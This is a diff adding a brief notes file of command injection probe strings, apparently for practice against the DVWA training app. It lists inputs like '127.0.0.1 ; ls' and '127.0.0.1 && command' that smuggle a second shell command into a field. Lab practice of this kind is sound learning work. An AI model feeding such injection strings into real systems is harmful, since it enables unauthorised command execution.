@@ -1,0 +1,12 @@
+####command injection#####
+-h #Linux help
+/? #win
+PARAM ; echo Command injected
+echo Injected| #perl
+
+
+#example try out on dwva:
+127.0.0.1
+127.0.0.1 ; ls #any command here
+#also try
+127.0.0.1 && command
